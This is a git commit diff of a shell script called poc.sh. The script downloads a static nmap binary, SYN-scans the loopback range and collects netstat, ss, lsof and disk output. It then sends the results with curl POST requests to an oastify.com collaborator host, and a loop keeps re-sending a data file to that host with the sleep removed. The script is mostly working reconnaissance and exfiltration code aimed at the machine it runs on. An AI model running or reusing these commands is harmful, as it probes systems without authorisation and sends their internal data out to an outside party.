d1a2eb0931c5a51001ee81e944b44609ade8a820
whalebone7 <125891350+whalebone7@users.noreply.github.com>
2025-01-31 05:34:58 +0100

    Update poc.sh

--- poc.sh
+++ poc.sh
@@ -1,18 +1,15 @@
 
 wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap
 chmod +x nmap
-echo "Scanning eth0 range (172.17.0.0/16)..." >  output.txt
-./nmap -vv -sS 172.17.0.0/16 >> output.txt
-
-# Scan the lo range
-echo -e "\nScanning lo range (127.0.0.0/8)..." >> output.txt
+# I used nmap to scan but got nothing.
 ./nmap -vv -sS 127.0.0.0/8 >> output.txt
 netstat -a >> output.txt
+df -h >> output.txt
 ss -tuln >> output.txt
 lsof -i -n -P >> output.txt
 netstat -tuln >> output.txt
 
-curl -k -X POST -H "Content-Type: text/plain" --data-binary @output.txt 'http:/hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/nmap'
+curl -k -X POST -H "Content-Type: text/plain" --data-binary @output.txt 'http:/hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/network'
 
 echo "Scan complete and output sent to yoyo."
 
@@ -25,9 +22,5 @@ while true; do
 
     curl -v -k -X POST -d '@outdata.txt' 'http://hzk794fr06pdhgqkxzgmtb4gp7v2jx7m.oastify.com/outdata'
     
-    # Remove outdata.txt
-    rm -rf outdata.txt
-    
-  
-    sleep 5 
+    # Lets see how long i will keep the server running
 done
